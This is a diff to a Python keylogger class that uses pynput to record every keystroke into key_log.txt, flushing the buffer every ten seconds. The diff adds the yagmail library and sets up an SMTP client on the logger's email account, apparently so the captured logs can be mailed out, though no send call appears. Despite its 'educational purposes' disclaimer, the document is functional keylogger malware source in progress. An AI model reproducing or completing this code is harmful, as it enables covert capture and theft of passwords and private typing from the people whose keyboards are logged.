@@ -1,6 +1,7 @@
-from pynput.keyboard import Key, Listener
-import logging
-import time
+from pynput.keyboard import Key, Listener # used to listen to keystrokes
+import logging, time, yagmail  # import used to log, get elapsed time, and send emails
+from logging.handlers import TimedRotatingFileHandler # used to rotate logs 
+
 
 class KeyLogger:
     """
@@ -8,19 +9,28 @@ class KeyLogger:
     <!This is solely for educational purposes!>
         
     KeyLogger used to track keystrokes on keyboards
-    toemail: email being sent to by logger
-    lemail: loggers email account
-    pswd: loggers email password
-    pswd: password
-    stime: time of the current logging round
+    to_email: email being sent to by logger
+    log_email: loggers email account
+    mem: string buffer to minimize logging writeouts
+    start_time: time of the current logging cycle
     """
-    def __init__(self, log_dir="", email="default@gmail.com", pswd="drowssap"):
-        self.toemail = email
-        self.lemail = "default@gmail.com"
-        self.pswd = pswd
+    def __init__(self, email="default@gmail.com", log_dir=""):
+        self.to_email = email
+        self.log_email = "@gmail.com"
         self.mem = []
-        self.stime = time.time()
+        self.start_time = time.time()
+        yag = yagmail.SMTP(self.log_email)
         logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.INFO, format='%(asctime)s: %(message)s')
+
+    def run_keylogger(self):
+        """
+        Runs keylogger. key_log.txt will be updated every 10 seconds and 
+        """
+        with Listener(on_press=self.__on_press) as listener:
+            try:
+                listener.join()
+            except Exception:
+                print("Threading error")
 
     def __screenshot(self):
         """
@@ -34,16 +44,15 @@ class KeyLogger:
         Action taken on keyboard press
         """
         self.mem.append(str(key))
-        if time.time() - self.stime >= 10.0 or key == Key.space or key == Key.enter:
-            # log the data, update time and flush buffer
+        # log the data, update time and flush buffer
+        if self.__decide_flush(key):
             logging.info("".join(self.mem))
             self.mem.clear() 
-            self.stime = time.time()
-            
-    def run_keylogger(self):
-        with Listener(on_press=self.__on_press) as listener:
-            try:
-                listener.join()
-            except Exception:
-                print("Threading error")
+            self.start_time = time.time()
+    
+    def __decide_flush(self, key):
+        """
+        private function used to decide if appropriate to flush buffer
+        """
+        return True if time.time() - self.start_time >= 10.0 else False
     
